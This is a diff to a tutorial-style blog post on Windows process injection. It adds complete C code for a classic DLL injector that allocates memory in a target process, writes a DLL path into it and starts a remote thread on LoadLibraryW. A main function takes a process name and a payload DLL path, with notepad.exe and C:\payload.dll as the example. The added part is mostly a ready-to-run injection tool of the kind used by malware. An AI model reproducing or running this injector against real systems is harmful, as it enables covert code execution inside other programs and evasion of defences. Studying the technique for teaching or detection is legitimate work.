@@ -87,10 +87,87 @@ We need to use `VirtualAllocEx`{:.language-c} to allocate a buffer inside the re
 
 ### Getting the Address of LoadLibraryW
 
-`GetModuleHandle`{:.language-c} gives us the base address of `kernel32.dll`{:.language-c} in our own process, and `GetProcAddress`{:.language-c} resolves `LoadLibraryW` from that base. As mentioned above, because `kernel32.dll`{:.language-c} is mapped at the same address in every process, this address is valid in the target process as well.
+`GetModuleHandle`{:.language-c} gives us the base address of `kernel32.dll`{:.language-c} in our own process, and `GetProcAddress`{:.language-c} resolves `LoadLibraryW`{:.language-c} from that base. As mentioned above, because `kernel32.dll`{:.language-c} is mapped at the same address in every process, this address is valid in the target process as well.
 
 ### Creating the Remote Thread
 
 Finally, `CreateRemoteThread`{:.language-c} spawns a new thread in the target process. We pass it the address of `LoadLibraryW`{:.language-c} as the thread start routine and our allocated DLL path buffer as the argument.
 
+```c
+BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR szDllPath) {
 
+    SIZE_T sNumberOfBytesWritten  = 0;
+    DWORD  dwThreadId             = 0;
+    SIZE_T sDllPathSize           = (wcslen(szDllPath) + 1) * sizeof(WCHAR);
+
+    // allocate memory in the remote process for the DLL path
+    LPVOID pDllPathAddress = VirtualAllocEx(hProcess, NULL, sDllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (pDllPathAddress == NULL) {
+        printf("[!] VirtualAllocEx failed: %d\n", GetLastError());
+        return FALSE;
+    }
+    printf("[+] Allocated memory at 0x%p in remote process\n", pDllPathAddress);
+
+    // write the DLL path into the allocated memory
+    if (!WriteProcessMemory(hProcess, pDllPathAddress, szDllPath, sDllPathSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sDllPathSize) {
+        printf("[!] WriteProcessMemory failed: %d\n", GetLastError());
+        return FALSE;
+    }
+    printf("[+] Wrote %zu bytes to remote process\n", sNumberOfBytesWritten);
+
+    // get the address of LoadLibraryW - valid in the remote process because kernel32.dll
+    // is mapped at the same base address across all processes
+    LPVOID pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
+    if (pLoadLibraryW == NULL) {
+        printf("[!] GetProcAddress failed: %d\n", GetLastError());
+        return FALSE;
+    }
+    printf("[+] LoadLibraryW address: 0x%p\n", pLoadLibraryW);
+
+    // create a remote thread that calls LoadLibraryW with our DLL path
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW, pDllPathAddress, 0, &dwThreadId);
+    if (hThread == NULL) {
+        printf("[!] CreateRemoteThread failed: %d\n", GetLastError());
+        return FALSE;
+    }
+    printf("[+] Remote thread created with TID %d\n", dwThreadId);
+
+    return TRUE;
+}
+```
+### Implementing the main function and tying it together
+
+```c
+int wmain(int argc, wchar_t* argv[]) {
+
+    DWORD  dwProcessId = 0;
+    HANDLE hProcess    = NULL;
+
+    if (argc != 3) {
+        printf("Usage: %ls <process name> <DLL path>\n", argv[0]);
+        printf("Example: %ls notepad.exe C:\\payload.dll\n", argv[0]);
+        return -1;
+    }
+
+    LPWSTR szProcessName = argv[1];
+    LPWSTR szDllPath     = argv[2];
+
+    printf("[*] Searching for process: %ls\n", szProcessName);
+
+    if (!GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
+        printf("[!] Could not find or open target process\n");
+        return -1;
+    }
+    printf("[+] Found %ls with PID %d\n", szProcessName, dwProcessId);
+
+    if (!InjectDllToRemoteProcess(hProcess, szDllPath)) {
+        printf("[!] DLL injection failed\n");
+        CloseHandle(hProcess);
+        return -1;
+    }
+    printf("[+] DLL injected successfully\n");
+
+    CloseHandle(hProcess);
+    return 0;
+}
+```
